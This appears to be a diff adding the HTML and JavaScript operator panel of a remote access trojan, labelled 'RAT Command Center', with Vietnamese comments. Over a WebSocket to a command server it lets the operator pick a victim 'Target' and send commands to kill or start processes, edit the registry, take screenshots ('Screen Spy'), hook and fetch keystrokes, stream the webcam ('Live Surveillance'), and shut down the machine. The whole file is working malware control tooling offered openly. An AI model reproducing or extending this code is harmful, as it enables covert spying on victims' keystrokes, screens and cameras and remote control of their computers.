@@ -1,0 +1,823 @@
+﻿<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Command Center</title>
+
+    <!-- Bootstrap 5 -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+    <style>
+        :root {
+            /* --- Dark Mode Variables (Default) --- */
+            --bg-body: #0f172a;
+            --bg-panel: #1e293b;
+            --bg-sidebar: rgba(30, 41, 59, 0.7);
+            --border-color: rgba(255, 255, 255, 0.1);
+            --primary-color: #3b82f6;
+            --accent-color: #06b6d4;
+            --text-main: #e2e8f0;
+            --text-muted: #94a3b8;
+            --text-inverse: #000000;
+            --hover-bg: rgba(255, 255, 255, 0.05);
+            --table-head-bg: rgba(0, 0, 0, 0.2);
+            --glass-btn-bg: rgba(255, 255, 255, 0.1);
+            --danger: #ef4444;
+            --success: #10b981;
+            --warning: #f59e0b;
+            --scroll-track: #0f172a;
+            --scroll-thumb: #475569;
+        }
+
+        /* --- Light Mode Variables --- */
+        .light-mode {
+            --bg-body: #f1f5f9;
+            --bg-panel: #ffffff;
+            --bg-sidebar: rgba(255, 255, 255, 0.85);
+            --border-color: rgba(0, 0, 0, 0.1);
+            --primary-color: #2563eb;
+            --accent-color: #0891b2;
+            --text-main: #334155;
+            --text-muted: #64748b;
+            --text-inverse: #ffffff;
+            --hover-bg: rgba(0, 0, 0, 0.05);
+            --table-head-bg: #f8fafc;
+            --glass-btn-bg: rgba(0, 0, 0, 0.05);
+            --scroll-track: #f1f5f9;
+            --scroll-thumb: #cbd5e1;
+        }
+
+        body {
+            background-color: var(--bg-body);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            overflow: hidden;
+            transition: background-color 0.3s ease, color 0.3s ease;
+        }
+
+        /* Override Bootstrap Classes */
+        .text-muted {
+            color: var(--text-muted) !important;
+        }
+
+        .border-secondary {
+            border-color: var(--border-color) !important;
+        }
+
+        /* --- Toast Notification (Đoạn CSS bạn cần) --- */
+        #toast-container {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 9999;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+        }
+
+        .custom-toast {
+            min-width: 300px;
+            background: var(--bg-panel);
+            border-left: 4px solid var(--primary-color);
+            color: var(--text-main);
+            padding: 15px;
+            border-radius: 4px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            animation: slideIn 0.3s ease-out forwards;
+            border: 1px solid var(--border-color);
+        }
+
+            .custom-toast.success {
+                border-left-color: var(--success);
+            }
+
+            .custom-toast.error {
+                border-left-color: var(--danger);
+            }
+
+            .custom-toast.warning {
+                border-left-color: var(--warning);
+            }
+
+        @keyframes slideIn {
+            from {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideOut {
+            to {
+                transform: translateX(100%);
+                opacity: 0;
+            }
+        }
+
+        /* --- Scrollbar Custom --- */
+        ::-webkit-scrollbar {
+            width: 8px;
+            height: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: var(--scroll-track);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--scroll-thumb);
+            border-radius: 4px;
+        }
+
+            ::-webkit-scrollbar-thumb:hover {
+                background: var(--primary-color);
+            }
+
+        /* --- Sidebar Styling --- */
+        .sidebar {
+            height: 100vh;
+            background: var(--bg-sidebar);
+            backdrop-filter: blur(15px);
+            border-right: 1px solid var(--border-color);
+            display: flex;
+            flex-direction: column;
+            padding-top: 20px;
+            transition: background 0.3s ease;
+        }
+
+        .brand-title {
+            font-weight: 700;
+            letter-spacing: 1px;
+            color: var(--accent-color);
+            margin-bottom: 20px;
+        }
+
+        .nav-link {
+            color: var(--text-muted);
+            padding: 12px 20px;
+            border-radius: 8px;
+            margin-bottom: 5px;
+            transition: all 0.2s ease;
+            font-size: 0.95rem;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+            .nav-link:hover {
+                background: var(--hover-bg);
+                color: var(--text-main);
+                transform: translateX(5px);
+            }
+
+            .nav-link.active {
+                background: linear-gradient(90deg, rgba(59, 130, 246, 0.2) 0%, rgba(59, 130, 246, 0) 100%);
+                color: var(--primary-color);
+                border-left: 3px solid var(--primary-color);
+            }
+
+        .light-mode .nav-link.active {
+            background: rgba(37, 99, 235, 0.1);
+        }
+
+        .nav-link i {
+            width: 20px;
+            text-align: center;
+        }
+
+        /* --- Main Content --- */
+        .main-wrapper {
+            height: 100vh;
+            overflow-y: auto;
+            padding: 20px 30px;
+        }
+
+        .content-section {
+            display: none;
+            animation: fadeIn 0.4s ease-in-out;
+        }
+
+            .content-section.active {
+                display: block;
+            }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(10px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        /* --- Cards & Panels --- */
+        .card {
+            background: var(--bg-panel);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05);
+            transition: background 0.3s ease, border 0.3s ease;
+        }
+
+        /* --- Form Elements --- */
+        .form-select, .form-control {
+            background-color: var(--bg-body);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+        }
+
+            .form-select:focus, .form-control:focus {
+                background-color: var(--bg-panel);
+                color: var(--text-main);
+                border-color: var(--primary-color);
+                box-shadow: 0 0 0 0.25rem rgba(59, 130, 246, 0.25);
+            }
+
+            .form-control::placeholder {
+                color: var(--text-muted);
+                opacity: 0.7;
+            }
+
+        /* --- Terminal Style --- */
+        .terminal {
+            background: #111;
+            color: #4ade80;
+            font-family: 'JetBrains Mono', monospace;
+            padding: 15px;
+            border-radius: 6px;
+            border: 1px solid #333;
+            height: 350px;
+            overflow-y: auto;
+            font-size: 0.9rem;
+            box-shadow: inset 0 0 20px rgba(0,0,0,0.8);
+        }
+
+        /* --- Tables --- */
+        .table {
+            --bs-table-bg: transparent;
+            --bs-table-color: var(--text-muted);
+            --bs-table-border-color: var(--border-color);
+        }
+
+            .table thead th {
+                color: var(--text-main);
+                background-color: var(--table-head-bg);
+                font-weight: 600;
+                border-bottom: 2px solid var(--border-color);
+            }
+
+        .table-hover tbody tr:hover {
+            color: var(--text-main);
+            background-color: var(--hover-bg);
+        }
+
+        /* --- Badges & Status --- */
+        .status-dot {
+            height: 10px;
+            width: 10px;
+            background-color: var(--danger);
+            border-radius: 50%;
+            display: inline-block;
+            box-shadow: 0 0 5px var(--danger);
+            margin-right: 5px;
+        }
+
+            .status-dot.connected {
+                background-color: var(--success);
+                box-shadow: 0 0 8px var(--success);
+                animation: pulse 2s infinite;
+            }
+
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0.7);
+            }
+
+            70% {
+                box-shadow: 0 0 0 6px rgba(16, 185, 129, 0);
+            }
+
+            100% {
+                box-shadow: 0 0 0 0 rgba(16, 185, 129, 0);
+            }
+        }
+
+        /* --- Buttons --- */
+        .btn-glass {
+            background: var(--glass-btn-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            transition: all 0.2s;
+        }
+
+            .btn-glass:hover {
+                background: var(--hover-bg);
+                color: var(--primary-color);
+                border-color: var(--primary-color);
+                transform: translateY(-1px);
+            }
+
+        /* Theme Toggle Button */
+        .theme-toggle-btn {
+            cursor: pointer;
+            padding: 8px 12px;
+            border-radius: 20px;
+            background: var(--glass-btn-bg);
+            border: 1px solid var(--border-color);
+            color: var(--text-main);
+            font-size: 0.85rem;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin: 10px 15px 0 15px;
+        }
+
+            .theme-toggle-btn:hover {
+                background: var(--hover-bg);
+                border-color: var(--primary-color);
+            }
+    </style>
+</head>
+<body>
+
+    <!-- Container cho Toast Notification -->
+    <div id="toast-container"></div>
+
+    <div class="container-fluid">
+        <div class="row">
+            <!-- Sidebar -->
+            <div class="col-md-2 sidebar">
+                <div class="text-center">
+                    <h4 class="brand-title"><i class="fa-solid fa-ghost"></i> RAT ADMIN</h4>
+                </div>
+
+                <button class="theme-toggle-btn mb-3" onclick="toggleTheme()">
+                    <i class="fa-solid fa-moon" id="themeIcon"></i>
+                    <span id="themeText">Dark Mode</span>
+                </button>
+
+                <div class="px-3 mb-4">
+                    <label class="form-label text-muted small text-uppercase fw-bold" style="font-size: 0.7rem;">Target Selection</label>
+                    <select id="agentSelect" class="form-select form-select-sm mb-2 shadow-none"></select>
+                    <div class="d-flex align-items-center">
+                        <span id="statusDot" class="status-dot"></span>
+                        <span id="statusText" class="small text-muted">Disconnected</span>
+                    </div>
+                </div>
+
+                <ul class="nav flex-column px-2">
+                    <li class="nav-item"><a class="nav-link active" onclick="showTab('dashboard')"><i class="fa-solid fa-gauge-high"></i> Dashboard</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('process')"><i class="fa-solid fa-microchip"></i> Task Manager</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('apps')"><i class="fa-brands fa-windows"></i> Applications</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('registry')"><i class="fa-solid fa-code-branch"></i> Registry</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('screen')"><i class="fa-solid fa-desktop"></i> Screen Spy</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('keylog')"><i class="fa-regular fa-keyboard"></i> Keylogger</a></li>
+                    <li class="nav-item"><a class="nav-link" onclick="showTab('webcam')"><i class="fa-solid fa-video"></i> Webcam Stream</a></li>
+                </ul>
+
+                <div class="mt-auto p-3 text-center">
+                    <small class="text-muted" style="font-size: 0.7rem;">v3.0 Ultimate</small>
+                </div>
+            </div>
+
+            <!-- Main Content -->
+            <div class="col-md-10 main-wrapper">
+
+                <!-- Dashboard -->
+                <div id="dashboard" class="content-section active">
+                    <h2 class="mb-4 fw-light">System <span class="fw-bold text-primary">Overview</span></h2>
+
+                    <div class="row g-4">
+                        <div class="col-md-8">
+                            <div class="card p-4 h-100">
+                                <h5><i class="fa-solid fa-circle-info text-info me-2"></i>Control Panel</h5>
+                                <p style="color: var(--text-muted);">Chọn một Agent từ menu bên trái để bắt đầu điều khiển. Hệ thống đang hoạt động ở chế độ bảo mật.</p>
+                                <hr class="border-secondary" style="opacity: 0.5">
+                                <div class="d-flex gap-3 mt-3">
+                                    <button class="btn btn-outline-danger px-4" onclick="sendCommand('SHUTDOWN', '')">
+                                        <i class="fa-solid fa-power-off me-2"></i> Shutdown
+                                    </button>
+                                    <button class="btn btn-outline-warning px-4" onclick="sendCommand('RESTART', '')">
+                                        <i class="fa-solid fa-rotate-right me-2"></i> Reboot
+                                    </button>
+                                    <!-- Nút Gửi Tin Nhắn -->
+                                    <button class="btn btn-outline-primary px-4" onclick="openMsgModal()">
+                                        <i class="fa-solid fa-comment-dots me-2"></i> Message
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-4">
+                            <div class="card p-4 h-100 d-flex flex-column justify-content-center align-items-center text-center">
+                                <i class="fa-solid fa-shield-halved fa-3x text-success mb-3"></i>
+                                <h5>Connection Secure</h5>
+                                <small class="text-muted">Encrypted WebSocket Tunnel</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Process -->
+                <div id="process" class="content-section">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h3 class="fw-light">Task <span class="text-primary fw-bold">Manager</span></h3>
+                        <div class="btn-group">
+                            <button class="btn btn-glass btn-sm" onclick="sendCommand('GET_PROCESS', '')"><i class="fa-solid fa-rotate me-1"></i> Refresh</button>
+                            <button class="btn btn-success btn-sm" onclick="startApp()"><i class="fa-solid fa-play me-1"></i> Run New Task</button>
+                        </div>
+                    </div>
+                    <div class="card overflow-hidden">
+                        <div class="table-responsive">
+                            <table class="table table-hover mb-0">
+                                <thead class="table-light"><tr><th>PID</th><th>Process Name</th><th>Threads</th><th class="text-end">Action</th></tr></thead>
+                                <tbody id="processTable" class="font-monospace small"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Applications -->
+                <div id="apps" class="content-section">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h3 class="fw-light">Active <span class="text-primary fw-bold">Applications</span></h3>
+                        <div class="btn-group">
+                            <button class="btn btn-glass btn-sm" onclick="sendCommand('GET_APPS', '')"><i class="fa-solid fa-rotate me-1"></i> Refresh</button>
+                            <button class="btn btn-primary btn-sm" onclick="startProgram('START_APP')"><i class="fa-solid fa-plus me-1"></i> Open App</button>
+                        </div>
+                    </div>
+                    <div class="card overflow-hidden">
+                        <div class="table-responsive">
+                            <table class="table table-hover mb-0">
+                                <thead class="table-light"><tr><th>PID</th><th>App Name</th><th>Window Title</th><th class="text-end">Controls</th></tr></thead>
+                                <tbody id="appTable"></tbody>
+                            </table>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Registry -->
+                <div id="registry" class="content-section">
+                    <h3 class="fw-light mb-4">Registry <span class="text-warning fw-bold">Editor</span></h3>
+                    <div class="card p-4 mb-3">
+                        <div class="row g-3">
+                            <div class="col-md-3">
+                                <label class="small text-muted">Root</label>
+                                <select id="regRoot" class="form-select">
+                                    <option>HKEY_CURRENT_USER</option>
+                                    <option>HKEY_LOCAL_MACHINE</option>
+                                    <option>HKEY_CLASSES_ROOT</option>
+                                </select>
+                            </div>
+                            <div class="col-md-7">
+                                <label class="small text-muted">Path</label>
+                                <input id="regPath" class="form-control" placeholder="Software\Microsoft\Windows">
+                            </div>
+                            <div class="col-md-2">
+                                <label class="small text-muted">Type</label>
+                                <select id="regType" class="form-select"><option>String</option><option>DWORD</option></select>
+                            </div>
+                            <div class="col-md-6"><input id="regName" class="form-control" placeholder="Key Name"></div>
+                            <div class="col-md-6"><input id="regValue" class="form-control" placeholder="Value Data"></div>
+                            <div class="col-12 text-end mt-3">
+                                <div class="btn-group">
+                                    <button class="btn btn-info" onclick="sendReg('GET_VALUE')">Read</button>
+                                    <button class="btn btn-warning" onclick="sendReg('SET_VALUE')">Write</button>
+                                    <button class="btn btn-success" onclick="sendReg('CREATE_KEY')">Create Key</button>
+                                    <button class="btn btn-danger" onclick="sendReg('DELETE_VALUE')">Delete Val</button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="terminal" id="regOutput">
+                        <span style="opacity: 0.5">// Registry output will appear here...</span><br>
+                    </div>
+                </div>
+
+                <!-- Screen Spy -->
+                <div id="screen" class="content-section">
+                    <div class="d-flex justify-content-between align-items-center mb-4">
+                        <h3 class="fw-light">Screen <span class="text-primary fw-bold">Capture</span></h3>
+                        <div class="btn-group">
+                            <button class="btn btn-primary" onclick="sendCommand('TAKE_PIC', '')"><i class="fa-solid fa-camera me-2"></i> Capture Now</button>
+                            <button class="btn btn-outline-secondary" onclick="document.getElementById('gallery').innerHTML=''"><i class="fa-solid fa-trash"></i> Clear</button>
+                        </div>
+                    </div>
+                    <div class="row g-3" id="gallery"></div>
+                </div>
+
+                <!-- Keylogger -->
+                <div id="keylog" class="content-section">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <h3 class="fw-light">Keylog <span class="text-danger fw-bold">Monitor</span></h3>
+                        <div class="btn-group">
+                            <button class="btn btn-danger" onclick="sendCommand('KEYLOG_HOOK', '')"><i class="fa-solid fa-record-vinyl me-2"></i>Hook</button>
+                            <button class="btn btn-secondary" onclick="sendCommand('KEYLOG_UNHOOK', '')">Unhook</button>
+                            <button class="btn btn-primary" onclick="sendCommand('KEYLOG_PRINT', '')"><i class="fa-solid fa-download me-2"></i>Fetch Logs</button>
+                            <button class="btn btn-glass" onclick="sendCommand('KEYLOG_CLEAR', '')">Clear Remote</button>
+                        </div>
+                    </div>
+                    <div class="terminal" id="keylogData" style="height: 500px; font-size: 0.8rem; color: #fbbf24;">
+                        <span style="opacity: 0.5">// Keystrokes will appear here...</span><br>
+                    </div>
+                </div>
+
+                <!-- Webcam -->
+                <div id="webcam" class="content-section">
+                    <div class="d-flex justify-content-between align-items-center mb-3">
+                        <h3 class="fw-light">Live <span class="text-danger fw-bold">Surveillance</span></h3>
+                        <div class="d-flex align-items-center gap-3">
+                            <div class="bg-dark px-3 py-1 rounded border border-secondary">
+                                <small class="text-muted">FPS:</small> <span id="fpsCounter" class="fw-bold text-success">0</span>
+                            </div>
+                            <span class="badge bg-secondary" id="webcamStatus">OFFLINE</span>
+                            <div class="btn-group">
+                                <button class="btn btn-success" onclick="sendCommand('WEBCAM_START', '')"><i class="fa-solid fa-play"></i> Start</button>
+                                <button class="btn btn-danger" onclick="stopWebcamUI()"><i class="fa-solid fa-stop"></i> Stop</button>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="card p-1 bg-black border-secondary d-flex justify-content-center align-items-center" style="min-height: 480px;">
+                        <img id="webcamImg" src="https://via.placeholder.com/800x600/000000/333333?text=NO+SIGNAL"
+                             style="max-width: 100%; max-height: 70vh; border-radius: 4px; box-shadow: 0 0 20px rgba(0,0,0,0.5);">
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <!-- SCRIPT LOGIC -->
+    <script>
+        const MY_ID = "WEB_" + Date.now();
+        const ws = new WebSocket("ws://localhost:8080");
+        let currentAgent = "";
+        let frameCount = 0;
+        let lastFpsTime = Date.now();
+
+        // 1. HỆ THỐNG TOAST NOTIFICATION (Mới)
+        function showToast(msg, type = 'info') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
+            toast.className = `custom-toast ${type}`;
+
+            let icon = 'fa-circle-info';
+            if (type === 'success') icon = 'fa-circle-check';
+            if (type === 'error') icon = 'fa-circle-exclamation';
+            if (type === 'warning') icon = 'fa-triangle-exclamation';
+
+            toast.innerHTML = `
+                    <div class="d-flex align-items-center gap-3">
+                        <i class="fa-solid ${icon} fa-lg"></i>
+                        <div>
+                            <div class="fw-bold text-uppercase" style="font-size: 0.7rem; opacity: 0.8">${type}</div>
+                            <div>${msg}</div>
+                        </div>
+                    </div>
+                    <button class="btn-close btn-close-white" onclick="this.parentElement.remove()"></button>
+                `;
+            container.appendChild(toast);
+            setTimeout(() => {
+                toast.style.animation = 'slideOut 0.3s ease-in forwards';
+                toast.addEventListener('animationend', () => toast.remove());
+            }, 4000);
+        }
+
+        // 2. Logic Theme
+        function toggleTheme() {
+            document.body.classList.toggle('light-mode');
+            const isLight = document.body.classList.contains('light-mode');
+            localStorage.setItem('theme', isLight ? 'light' : 'dark');
+            updateThemeUI(isLight);
+        }
+        function updateThemeUI(isLight) {
+            const icon = document.getElementById('themeIcon');
+            const text = document.getElementById('themeText');
+            if (isLight) {
+                icon.className = 'fa-solid fa-sun text-warning';
+                text.innerText = 'Light Mode';
+            } else {
+                icon.className = 'fa-solid fa-moon text-primary';
+                text.innerText = 'Dark Mode';
+            }
+        }
+        window.addEventListener('DOMContentLoaded', () => {
+            const savedTheme = localStorage.getItem('theme');
+            if (savedTheme === 'light') { document.body.classList.add('light-mode'); updateThemeUI(true); }
+            else updateThemeUI(false);
+        });
+
+        // 3. Xử lý Gửi Tin Nhắn
+        function openMsgModal() {
+            const msg = prompt("Nhập nội dung tin nhắn gửi đến Target:");
+            if (msg) {
+                sendCommand("SHOW_MSG", msg);
+                showToast("Đã gửi tin nhắn đến Target", "success");
+            }
+        }
+
+        // --- WEBSOCKET LOGIC ---
+        const statusDot = document.getElementById("statusDot");
+        const statusText = document.getElementById("statusText");
+
+        ws.onopen = () => {
+            statusText.innerText = "Connected";
+            statusText.className = "small text-success fw-bold";
+            statusDot.classList.add("connected");
+            ws.send(JSON.stringify({ type: "REGISTER", role: "ADMIN", id: MY_ID }));
+            showToast("Kết nối thành công tới Server", "success");
+        };
+
+        ws.onclose = () => {
+            statusText.innerText = "Disconnected";
+            statusText.className = "small text-danger fw-bold";
+            statusDot.classList.remove("connected");
+            showToast("Mất kết nối tới Server!", "error");
+        }
+
+        ws.onmessage = (event) => {
+            const packet = JSON.parse(event.data);
+
+            if (packet.type === "AGENT_LIST") {
+                const select = document.getElementById("agentSelect");
+                const oldVal = select.value;
+                select.innerHTML = "";
+                packet.data.forEach(id => {
+                    const opt = document.createElement("option");
+                    opt.value = id; opt.text = id;
+                    select.appendChild(opt);
+                });
+                if (packet.data.includes(oldVal)) select.value = oldVal;
+                else if (packet.data.length > 0) select.value = packet.data[0];
+                currentAgent = select.value;
+            }
+
+            if (packet.from) {
+                const payload = packet.payload;
+                const cmd = payload.cmd;
+                const data = payload.data;
+
+                if (cmd === "PROCESS_LIST") {
+                    const list = JSON.parse(data);
+                    const tbody = document.getElementById("processTable");
+                    tbody.innerHTML = "";
+                    list.forEach(p => {
+                        tbody.innerHTML += `<tr>
+                                <td class="text-muted">${p.Id}</td>
+                                <td class="fw-bold" style="color: var(--text-main)">${p.Name}</td>
+                                <td>${p.Threads}</td>
+                                <td class="text-end"><button class='btn btn-sm btn-outline-danger py-0' onclick="killProc(${p.Id})"><i class="fa-solid fa-xmark"></i></button></td>
+                            </tr>`;
+                    });
+                    showToast("Cập nhật Task Manager thành công", "success");
+                }
+                else if (cmd === "APP_LIST") {
+                    const list = JSON.parse(data);
+                    const tbody = document.getElementById("appTable");
+                    tbody.innerHTML = "";
+                    list.forEach(app => {
+                        tbody.innerHTML += `<tr>
+                                <td class="text-muted">${app.Id}</td>
+                                <td class="text-primary fw-bold">${app.Name}</td>
+                                <td style="color: var(--text-main)">${app.Title}</td>
+                                <td class="text-end">
+                                    <button class='btn btn-sm btn-outline-danger py-0' onclick="killApp(${app.Id})"><i class="fa-solid fa-ban"></i> Close</button>
+                                </td>
+                            </tr>`;
+                    });
+                    showToast("Cập nhật Apps thành công", "success");
+                }
+                else if (cmd === "PIC_DATA") {
+                    addScreenToGallery(data);
+                    showToast("Đã nhận ảnh màn hình", "success");
+                }
+                else if (cmd === "KEYLOG_DATA") {
+                    const term = document.getElementById("keylogData");
+                    term.innerHTML += `<span style="color: inherit">${data}</span>`;
+                    term.scrollTop = term.scrollHeight;
+                }
+                else if (cmd === "REG_RESULT") {
+                    const term = document.getElementById("regOutput");
+                    term.innerText += `\n> ${data}`;
+                    term.scrollTop = term.scrollHeight;
+                    showToast("Kết quả Registry: " + data, "info");
+                }
+                else if (cmd === "LOG_MSG") {
+                    showToast("Agent: " + data, "info");
+                }
+                else if (cmd === "WEBCAM_FRAME") {
+                    document.getElementById("webcamImg").src = "data:image/jpeg;base64," + data;
+                    const status = document.getElementById("webcamStatus");
+                    status.innerText = "LIVE REC";
+                    status.className = "badge bg-danger animate-pulse";
+
+                    frameCount++;
+                    const now = Date.now();
+                    if (now - lastFpsTime >= 1000) {
+                        document.getElementById("fpsCounter").innerText = frameCount;
+                        frameCount = 0;
+                        lastFpsTime = now;
+                    }
+                }
+            }
+        };
+
+        function sendCommand(cmd, data) {
+            currentAgent = document.getElementById("agentSelect").value;
+            if (!currentAgent) { showToast("Chưa chọn Agent nào!", "error"); return; }
+            ws.send(JSON.stringify({ targetId: currentAgent, payload: { cmd: cmd, data: String(data) } }));
+        }
+
+        function sendReg(action) {
+            const payload = {
+                Action: action,
+                Root: document.getElementById("regRoot").value,
+                Path: document.getElementById("regPath").value,
+                Name: document.getElementById("regName").value,
+                Value: document.getElementById("regValue").value,
+                Type: document.getElementById("regType").value
+            };
+            sendCommand("REG_ACTION", JSON.stringify(payload));
+        }
+
+        function addScreenToGallery(base64) {
+            const gallery = document.getElementById("gallery");
+            const time = new Date().toLocaleTimeString();
+            const imgSrc = "data:image/png;base64," + base64;
+            const html = `
+                    <div class="col-md-3 col-sm-6">
+                        <div class="card h-100 border-0 shadow">
+                            <div class="position-relative">
+                                <img src="${imgSrc}" class="card-img-top" style="height: 150px; object-fit: cover; opacity: 0.9; transition: 0.3s;" onmouseover="this.style.opacity=1" onmouseout="this.style.opacity=0.9">
+                                <span class="position-absolute top-0 end-0 badge bg-primary m-2">${time}</span>
+                            </div>
+                            <div class="card-body p-2 d-grid">
+                                <a href="${imgSrc}" download="capture.png" class="btn btn-sm btn-outline-secondary">Download</a>
+                            </div>
+                        </div>
+                    </div>`;
+            gallery.insertAdjacentHTML('afterbegin', html);
+        }
+
+        function killProc(pid) {
+            if (confirm("Kill process " + pid + "?")) {
+                sendCommand("KILL_PROCESS", pid);
+                showToast("Đang gửi lệnh kill process...", "warning");
+            }
+        }
+        function startApp() {
+            const n = prompt("Executable Name (e.g., notepad, calc):");
+            if (n) {
+                sendCommand("START_PROCESS", n);
+                showToast("Đang mở " + n, "info");
+            }
+        }
+        function killApp(pid) {
+            if (confirm("Close application " + pid + "?")) {
+                sendCommand("KILL_APP", pid);
+                showToast("Đang đóng ứng dụng...", "warning");
+                setTimeout(() => sendCommand('GET_APPS', ''), 1000);
+            }
+        }
+        function startProgram(cmdType) {
+            const n = prompt("App Name:");
+            if (n) {
+                sendCommand(cmdType, n);
+                showToast("Đang gửi lệnh mở app...", "info");
+            }
+        }
+
+        function showTab(id) {
+            document.querySelectorAll(".content-section").forEach(d => d.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+            document.querySelectorAll(".nav-link").forEach(d => d.classList.remove('active'));
+            event.target.closest('.nav-link').classList.add('active');
+        }
+
+        function stopWebcamUI() {
+            sendCommand('WEBCAM_STOP', '');
+            document.getElementById("webcamImg").src = "https://via.placeholder.com/800x600/000000/333333?text=STREAM+STOPPED";
+            document.getElementById("webcamStatus").innerText = "OFFLINE";
+            document.getElementById("webcamStatus").className = "badge bg-secondary";
+            document.getElementById("fpsCounter").innerText = "0";
+            showToast("Đã dừng Webcam", "info");
+        }
+    </script>
+</body>
+</html>
